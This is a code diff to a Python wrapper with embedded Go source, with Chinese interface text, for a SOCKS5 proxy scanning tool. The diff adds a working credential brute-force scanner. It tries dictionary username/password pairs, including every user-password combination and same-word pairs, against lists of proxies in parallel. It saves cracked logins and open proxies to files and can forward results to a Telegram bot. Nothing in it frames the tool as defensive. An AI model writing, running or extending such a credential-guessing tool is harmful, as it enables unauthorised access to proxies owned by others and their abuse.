@@ -46,7 +46,6 @@ func verifyProtocol(target string, timeout time.Duration, results chan<- string)
 	}
 	defer conn.Close()
 
-	// 只进行第一步握手，确认是SOCKS5服务且无需认证
 	_, err = conn.Write([]byte{0x05, 0x01, 0x00})
 	if err != nil {
 		results <- ""
@@ -56,7 +55,7 @@ func verifyProtocol(target string, timeout time.Duration, results chan<- string)
 	conn.SetReadDeadline(time.Now().Add(timeout))
 	n, err := conn.Read(resp)
 	if err == nil && n == 2 && resp[0] == 0x05 && resp[1] == 0x00 {
-		results <- target // 协议验证成功！
+		results <- target
 	} else {
 		results <- ""
 	}
@@ -88,7 +87,7 @@ func main() {
 		for r := range results {
 			if r != "" {
 				validCount++
-				fmt.Println(r)
+				fmt.Println(r) // Keep printing to stdout for immediate feedback
 				fmt.Fprintln(writer, r)
 				writer.Flush()
 			}
@@ -191,48 +190,144 @@ func main() {
 # --- GO 语言核心代码 3: 全功能认证扫描器 (用于私有代理) ---
 GO_SOURCE_CODE_SCANNER = r'''
 package main
-import ( "bufio"; "flag"; "fmt"; "net"; "os"; "strings"; "sync"; "time" )
+
+import (
+	"bufio"
+	"flag"
+	"fmt"
+	"net"
+	"os"
+	"strings"
+	"sync"
+	"time"
+)
+
 type Creds struct { Username string; Password string }
-func checkProxyAuth(host string, port string, creds Creds, timeout time.Duration) {
-	target := fmt.Sprintf("%s:%s", host, port); conn, err := net.DialTimeout("tcp", target, timeout); if err != nil { return }; defer conn.Close()
-	_, err = conn.Write([]byte{0x05, 0x02, 0x00, 0x02}); if err != nil { return }; reply := make([]byte, 2); _, err = conn.Read(reply)
-	if err != nil || reply[0] != 0x05 { return }
+
+func checkProxyAuth(host, port string, creds Creds, timeout time.Duration) bool {
+	target := fmt.Sprintf("%s:%s", host, port)
+	conn, err := net.DialTimeout("tcp", target, timeout)
+	if err != nil { return false }
+	defer conn.Close()
+
+	conn.SetDeadline(time.Now().Add(timeout))
+
+	// Request methods: NO AUTH (0x00), USER/PASS (0x02)
+	_, err = conn.Write([]byte{0x05, 0x02, 0x00, 0x02})
+	if err != nil { return false }
+	
+	reply := make([]byte, 2)
+	_, err = conn.Read(reply)
+	if err != nil || reply[0] != 0x05 { return false }
+
 	switch reply[1] {
-	case 0x00: if creds.Username == "" && creds.Password == "" { fmt.Printf("[+] 成功: %s (无需认证)\n", target) }
-	case 0x02:
-		if creds.Username == "" && creds.Password == "" { return }
-		userBytes, passBytes := []byte(creds.Username), []byte(creds.Password); req := append([]byte{0x01, byte(len(userBytes))}, userBytes...)
-		req = append(req, byte(len(passBytes))); req = append(req, passBytes...); _, err = conn.Write(req); if err != nil { return }
-		authReply := make([]byte, 2); _, err = conn.Read(authReply)
-		if err == nil && authReply[0] == 0x01 && authReply[1] == 0x00 { fmt.Printf("[+] 成功: %s - 用户名: %s - 密码: %s\n", target, creds.Username, creds.Password) }
+	case 0x00: // No Authentication Required
+		return true
+	case 0x02: // Username/Password
+		if creds.Username == "" && creds.Password == "" { return false } // No point trying empty creds here
+		userBytes, passBytes := []byte(creds.Username), []byte(creds.Password)
+		req := append([]byte{0x01, byte(len(userBytes))}, userBytes...)
+		req = append(req, byte(len(passBytes)))
+		req = append(req, passBytes...)
+		_, err = conn.Write(req)
+		if err != nil { return false }
+		authReply := make([]byte, 2)
+		_, err = conn.Read(authReply)
+		if err == nil && authReply[0] == 0x01 && authReply[1] == 0x00 {
+			return true // User/pass auth success
+		}
 	}
+	return false
 }
+
 func fileToLines(path string) ([]string, error) {
 	file, err := os.Open(path); if err != nil { return nil, err }; defer file.Close(); var lines []string; scanner := bufio.NewScanner(file)
-	for scanner.Scan() { lines = append(lines, scanner.Text()) }; return lines, scanner.Err()
+	for scanner.Scan() { lines = append(lines, strings.TrimSpace(scanner.Text())) }; return lines, scanner.Err()
 }
+
 func main() {
-	proxyFile := flag.String("proxyFile", "", ""); dictFile := flag.String("dictFile", "", ""); threads := flag.Int("threads", 100, ""); timeout := flag.Int("timeout", 5, ""); flag.Parse()
-	var credentials []Creds
+	proxyFile := flag.String("proxyFile", "", "File with proxies (host:port)")
+	dictFile := flag.String("dictFile", "", "File with credentials (user:pass or user pass)")
+	outputFile := flag.String("outputFile", "auth_success.txt", "Output file for all successful authentications")
+	openFile := flag.String("openFile", "open_proxies.txt", "Output file for proxies with open authentication")
+	threads := flag.Int("threads", 100, "Concurrency threads")
+	timeout := flag.Int("timeout", 5, "Connection timeout (seconds)")
+	flag.Parse()
+
+	credentials := []Creds{{"", ""}} // Always check for NO AUTH
 	if *dictFile != "" {
 		dictLines, _ := fileToLines(*dictFile)
 		for _, line := range dictLines {
-			parts := strings.Fields(line); if len(parts) == 2 { credentials = append(credentials, Creds{parts[0], parts[1]}) } else {
-				parts = strings.SplitN(line, ":", 2); if len(parts) == 2 { credentials = append(credentials, Creds{parts[0], parts[1]}) }
+			var cred Creds
+			if parts := strings.SplitN(line, ":", 2); len(parts) == 2 {
+				cred = Creds{parts[0], parts[1]}
+			} else if parts = strings.Fields(line); len(parts) == 2 {
+				cred = Creds{parts[0], parts[1]}
+			}
+			if cred.Username != "" || cred.Password != "" {
+				credentials = append(credentials, cred)
 			}
 		}
-	} else { credentials = append(credentials, Creds{"", ""}) }
-	proxies, _ := fileToLines(*proxyFile); var wg sync.WaitGroup; sem := make(chan struct{}, *threads)
+	}
+	
+	proxies, _ := fileToLines(*proxyFile)
+	fmt.Fprintf(os.Stderr, "开始对 %d 个代理使用 %d 组凭证进行认证扫描...\n", len(proxies), len(credentials))
+
+	successCounts := make(map[string]int)
+	var mu sync.Mutex
+
+	outFile, _ := os.Create(*outputFile); defer outFile.Close()
+	successWriter := bufio.NewWriter(outFile)
+	defer successWriter.Flush()
+
+	openOutFile, _ := os.Create(*openFile); defer openOutFile.Close()
+	openWriter := bufio.NewWriter(openOutFile)
+	defer openWriter.Flush()
+
+	var wg sync.WaitGroup
+	sem := make(chan struct{}, *threads)
+
 	for _, proxy := range proxies {
-		parts := strings.Split(proxy, ":"); if len(parts) != 2 { continue }
+		parts := strings.Split(proxy, ":")
+		if len(parts) != 2 { continue }
+		host, port := parts[0], parts[1]
+
 		for _, cred := range credentials {
-			wg.Add(1); sem <- struct{}{}; go func(h, p string, c Creds) {
-				defer wg.Done(); defer func(){ <-sem }(); checkProxyAuth(h, p, c, time.Duration(*timeout)*time.Second)
-			}(parts[0], parts[1], cred)
+			wg.Add(1)
+			sem <- struct{}{}
+			go func(h, p string, c Creds) {
+				defer wg.Done()
+				defer func() { <-sem }()
+				
+				if checkProxyAuth(h, p, c, time.Duration(*timeout)*time.Second) {
+					target := fmt.Sprintf("%s:%s", h, p)
+					successMsg := fmt.Sprintf("[+] 成功: %s - 用户名: '%s' - 密码: '%s'", target, c.Username, c.Password)
+					if c.Username == "" && c.Password == "" {
+						successMsg = fmt.Sprintf("[+] 成功: %s (无需认证)", target)
+					}
+					
+					fmt.Println(successMsg) // Print to console
+
+					mu.Lock()
+					// Write to main success file
+					fmt.Fprintln(successWriter, successMsg)
+					
+					successCounts[target]++
+					if successCounts[target] == 2 { // First time we detect it as open
+						fmt.Fprintf(os.Stderr, "[!] 检测到开放代理: %s (接受多种凭证), 已记录至 %s\n", target, *openFile)
+						fmt.Fprintln(openWriter, target)
+						openWriter.Flush() // Write immediately
+					}
+					mu.Unlock()
+					successWriter.Flush()
+				}
+			}(host, port, cred)
 		}
 	}
 	wg.Wait()
+	fmt.Fprintf(os.Stderr, "认证扫描完成。成功结果已保存至 %s, 开放代理已保存至 %s\n", *outputFile, *openFile)
 }
+
 '''
 
 # --- Python 包装器 ---
@@ -287,7 +382,7 @@ def handle_config_menu(config):
 def print_header(title):
     print("\n" + "="*50); print(f"--- {title} ---"); print("="*50)
 
-def get_validated_input(prompt, validation_func, error_message):
+def get_validated_input(prompt, validation_func=lambda x: True, error_message="无效输入"):
     while True:
         user_input = input(prompt).strip()
         if validation_func(user_input): return user_input
@@ -339,25 +434,22 @@ def compile_go_binaries():
                         go_cache_path = os.path.join(temp_dir, "gocache_for_build")
                         os.makedirs(go_cache_path, exist_ok=True)
                         build_env["GOCACHE"] = go_cache_path
-                        print(f"  - 提示: 未找到HOME/USERPROFILE, 已临时设置GOCACHE: {go_cache_path}")
+                        print(f"  - 提示: 未找到HOME/USERPROFILE，已临时设置GOCACHE: {go_cache_path}")
                     
-                    subprocess.run(cmd, check=True, capture_output=True, text=True, env=build_env)
-                    
+                    result = subprocess.run(cmd, capture_output=True, text=True, env=build_env)
+                    if result.returncode != 0:
+                         print(f"\nGo程序编译失败: {name}\n{result.stderr}")
+                         return False
+
                     with open(hash_path, 'w') as f: f.write(current_hash)
                     print(f"  - '{name}' 编译完成。")
                 else:
                     print(f"  - 使用缓存的 '{name}'。")
                 COMPILED_BINARIES[name] = output_path
         print("Go核心程序准备就绪。"); return True
-    except subprocess.CalledProcessError as e:
-        error_message = f"\nGo程序编译失败: {e.stderr}"
-        if "cannot find main module" in e.stderr or "go.mod file not found" in e.stderr:
-            error_message += "\n[错误原因分析]: 这通常是因为Go编译器无法确定工作目录。可能与运行环境缺少'HOME'或'USERPROFILE'环境变量有关。\n本脚本已尝试自动处理此问题，但似乎仍旧失败。请检查Go语言环境安装是否完整。"
-        print(error_message)
-        return False
     except Exception as e: print(f"\n发生未知错误: {e}"); return False
 
-def run_go_executable(executable_name, args_list, pbar_desc="已找到"):
+def run_go_executable(executable_name, args_list):
     executable_path = COMPILED_BINARIES.get(executable_name)
     if not executable_path: print(f"错误: 未找到 '{executable_name}' 程序。"); return
     try:
@@ -367,20 +459,120 @@ def run_go_executable(executable_name, args_list, pbar_desc="已找到"):
             cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             text=True, encoding='utf-8', errors='replace'
         )
-        if "verifier" in executable_name:
-            with tqdm(desc=pbar_desc, unit=" 个", dynamic_ncols=True) as pbar:
-                for line in iter(process.stdout.readline, ''):
-                    if line: pbar.update(1)
-            stderr_output = process.stderr.read()
-            print("\n--- Go 核心日志 ---\n" + stderr_output.strip() + "\n--- 任务执行完毕 ---")
-        else: # For scanner
-            for line in iter(process.stdout.readline, ''): print(line.strip())
-            process.wait()
-            stderr_output = process.stderr.read()
-            if stderr_output: print(f"--- Go 核心错误 ---\n{stderr_output.strip()}")
-            print("--- 任务执行完毕 ---")
+
+        # Unified handling for stdout and stderr to prevent blocking
+        # And provide real-time feedback
+        for line in iter(process.stdout.readline, ''):
+             print(line.strip())
+
+        process.wait() # Wait for the process to finish
+        stderr_output = process.stderr.read()
+        if stderr_output:
+             print(f"--- Go 核心日志 ---\n{stderr_output.strip()}")
+
+        print("--- 任务执行完毕 ---")
+
     except Exception as e: print(f"执行Go程序时出错: {e}")
 
+# --- 认证扫描辅助函数 ---
+def create_dict_from_user_pass_files(temp_dir):
+    print_header("模式: username.txt + password.txt")
+    user_file = get_validated_input("请输入用户名文件 (username.txt): ", validate_file_exists, "文件不存在。")
+    pass_file = get_validated_input("请输入密码文件 (password.txt): ", validate_file_exists, "文件不存在。")
+
+    try:
+        with open(user_file, 'r', encoding='utf-8', errors='ignore') as f_user:
+            users = [line.strip() for line in f_user if line.strip()]
+        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f_pass:
+            passwords = [line.strip() for line in f_pass if line.strip()]
+        
+        temp_dict_path = os.path.join(temp_dir, 'combined_dict.txt')
+        with open(temp_dict_path, 'w', encoding='utf-8') as f_out:
+            for user in users:
+                for password in passwords:
+                    f_out.write(f"{user}:{password}\n")
+        print(f"已生成 {len(users) * len(passwords)} 条密码组合到临时文件。")
+        return temp_dict_path
+    except Exception as e:
+        print(f"创建密码本时出错: {e}")
+        return None
+
+def create_dict_from_same_user_pass(temp_dir):
+    print_header("模式: 用户名和密码相同")
+    wordlist_file = get_validated_input("请输入单词本文件 (例如: user.txt): ", validate_file_exists, "文件不存在。")
+    try:
+        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f_in:
+            words = [line.strip() for line in f_in if line.strip()]
+        
+        temp_dict_path = os.path.join(temp_dir, 'same_user_pass_dict.txt')
+        with open(temp_dict_path, 'w', encoding='utf-8') as f_out:
+            for word in words:
+                f_out.write(f"{word}:{word}\n")
+        print(f"已根据 {len(words)} 个单词生成同名密码组合到临时文件。")
+        return temp_dict_path
+    except Exception as e:
+        print(f"创建密码本时出错: {e}")
+        return None
+
+def handle_auth_scan(output_dir):
+    dict_file_path = None
+    temp_dir_for_dict = tempfile.mkdtemp()
+
+    try:
+        while True:
+            print_header("私有代理认证扫描 - 密码本模式选择")
+            print("  [1] 组合模式 (username.txt + password.txt)")
+            print("  [2] 同名模式 (username = password)")
+            print("  [3] 标准模式 (单文件 user:pass 或 user pass)")
+            print("  [b] 返回上级菜单")
+            choice = input("\n请选择密码本模式: ").lower()
+
+            if choice == '1':
+                dict_file_path = create_dict_from_user_pass_files(temp_dir_for_dict)
+                break
+            elif choice == '2':
+                dict_file_path = create_dict_from_same_user_pass(temp_dir_for_dict)
+                break
+            elif choice == '3':
+                print_header("模式: 标准密码本")
+                dict_file_path = get_validated_input("请输入密码本路径 (user:pass格式): ", validate_file_exists, "文件不存在。")
+                break
+            elif choice == 'b':
+                return
+            else:
+                print("无效输入。")
+        
+        if not dict_file_path:
+            print("未能生成或指定密码本，任务取消。")
+            return
+
+        proxy_file = get_validated_input("请输入代理文件 (host:port): ", validate_file_exists, "文件不存在。")
+        threads = get_validated_input("并发数 (默认100): ", lambda x: x=="" or validate_positive_integer(x), "") or "100"
+        timeout = get_validated_input("超时(秒, 默认5): ", lambda x: x=="" or validate_positive_integer(x), "") or "5"
+        
+        base, ext = os.path.splitext(os.path.basename(proxy_file))
+        success_output_file = os.path.join(output_dir, f"{base}_auth_success.txt")
+        open_proxy_output_file = os.path.join(output_dir, f"{base}_open_proxies.txt")
+
+        print("\n扫描结果将实时打印在控制台。")
+        print(f"所有成功认证的结果将保存到: {success_output_file}")
+        print(f"检测到的开放代理将保存到: {open_proxy_output_file}")
+        
+        cmd_args = [
+            "-proxyFile", proxy_file,
+            "-threads", threads,
+            "-timeout", timeout,
+            "-dictFile", dict_file_path,
+            "-outputFile", success_output_file,
+            "-openFile", open_proxy_output_file
+        ]
+        
+        run_go_executable("scanner", cmd_args)
+        
+    finally:
+        shutil.rmtree(temp_dir_for_dict) # 清理临时目录和里面的文件
+
+# --- 其他任务与主菜单 ---
 def format_duration(seconds):
     secs = int(seconds)
     mins, secs = divmod(secs, 60)
@@ -391,7 +583,7 @@ def send_telegram_notification(config, file_path, total_targets, duration_second
     chat_id = config.get("chat_id")
     
     timestamp = datetime.now().strftime("%Y%m%d-%H%M")
-    new_filename = f"Socks5-{timestamp}.txt"
+    new_filename = f"Socks5-{os.path.basename(file_path)}-{timestamp}.txt"
     
     custom_key = config.get('custom_id_key', 'VPS')
     custom_value = config.get('custom_id_value', '未设置')
@@ -413,25 +605,21 @@ def send_telegram_notification(config, file_path, total_targets, duration_second
         
         response.raise_for_status()
         result = response.json()
-        if result.get("ok"):
-            print("文件发送成功！")
-        else:
-            print(f"发送失败: {result.get('description', '未知错误')}")
-    except requests.exceptions.RequestException as e:
-        print(f"发送时发生网络错误: {e}")
-    except Exception as e:
-        print(f"发生未知错误: {e}")
+        if result.get("ok"): print("文件发送成功！")
+        else: print(f"发送失败: {result.get('description', '未知错误')}")
+    except requests.exceptions.RequestException as e: print(f"发送时发生网络错误: {e}")
+    except Exception as e: print(f"发生未知错误: {e}")
 
 def prompt_and_send_telegram(config, file_path, total_targets, duration_seconds):
     if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
-        print("\n结果文件为空，无需发送。")
+        print("\n结果文件为空或不存在，无需发送。")
         return
     
     if not config.get("bot_token") or not config.get("chat_id"):
         print("\n[!] Telegram 未配置。请在主菜单 -> [3] 设置 中配置 Bot Token 和 Chat ID 后再发送。")
         return
 
-    choice = input("\n是否将结果发送到 Telegram? (y/n): ").lower()
+    choice = input(f"\n是否将结果文件 '{os.path.basename(file_path)}' 发送到 Telegram? (y/n): ").lower()
     if choice == 'y':
         send_telegram_notification(config, file_path, total_targets, duration_seconds)
 
@@ -440,12 +628,12 @@ def execute_scan_task(config, output_dir, mode):
         "protocol": {
             "header": "验证Socks5协议 (快速)", "desc": "此模式只检查目标是否响应SOCKS5握手，不测试其可用性。",
             "threads_prompt": "并发数 (默认500): ", "threads_default": "500", "timeout_prompt": "超时(秒, 推荐5): ", "timeout_default": "5",
-            "output_suffix": "_protocol_verified", "executable": "protocol_verifier", "pbar_desc": "SOCKS5协议确认"
+            "output_suffix": "_protocol_verified"
         },
         "deep": {
             "header": "扫描公共代理 (无认证)", "desc": "此功能将深度验证代理，确保其不仅是SOCKS5服务，还能实际连接到目标网站。",
             "threads_prompt": "并发数 (默认200): ", "threads_default": "200", "timeout_prompt": "超时(秒, 推荐10): ", "timeout_default": "10",
-            "output_suffix": "_deep_verified", "executable": "deep_verifier", "pbar_desc": "可用公共代理"
+            "output_suffix": "_deep_verified"
         }
     }
     task = task_map[mode]
@@ -470,31 +658,21 @@ def execute_scan_task(config, output_dir, mode):
     cmd_args = ["-inputFile", input_file, "-outputFile", output_file_path, "-threads", threads, "-timeout", timeout]
     
     start_time = time.time()
-    run_go_executable(task["executable"], cmd_args, pbar_desc=task["pbar_desc"])
+    run_go_executable(mode+"_verifier", cmd_args) # "protocol_verifier" or "deep_verifier"
     end_time = time.time()
     
     duration = end_time - start_time
     prompt_and_send_telegram(config, output_file_path, total_targets, duration)
 
-def handle_auth_scan():
-    print_header("扫描私有代理 (需密码本)")
-    proxy_file = get_validated_input("请输入代理文件: ", validate_file_exists, "文件不存在。")
-    dict_file = get_validated_input("请输入密码本路径: ", validate_file_exists, "文件不存在。")
-    threads = get_validated_input("并发数 (默认100): ", lambda x: x=="" or validate_positive_integer(x), "") or "100"
-    timeout = get_validated_input("超时(秒, 默认5): ", lambda x: x=="" or validate_positive_integer(x), "") or "5"
-    cmd_args = ["-proxyFile", proxy_file, "-threads", threads, "-timeout", timeout, "-dictFile", dict_file]
-    
-    print("\n认证扫描的结果将直接打印在下方控制台。")
-    run_go_executable("scanner", cmd_args)
-    print("\n提示: 认证扫描模式不生成结果文件，因此无法发送到Telegram。")
-
 def handle_discover_usability(config, output_dir):
     while True:
         print_header("发现可用Socks5 (深度)")
-        print("  [1] 扫描公共代理 (无认证)"); print("  [2] 扫描私有代理 (需密码本)"); print("  [b] 返回主菜单")
+        print("  [1] 扫描公共代理 (无认证)")
+        print("  [2] 扫描私有代理 (需密码本)")
+        print("  [b] 返回主菜单")
         choice = input("\n请选择扫描类型: ").lower()
         if choice == '1': execute_scan_task(config, output_dir, "deep"); break
-        elif choice == '2': handle_auth_scan(); break
+        elif choice == '2': handle_auth_scan(output_dir); break
         elif choice == 'b': break
         else: print("无效输入，请重新选择。")
 
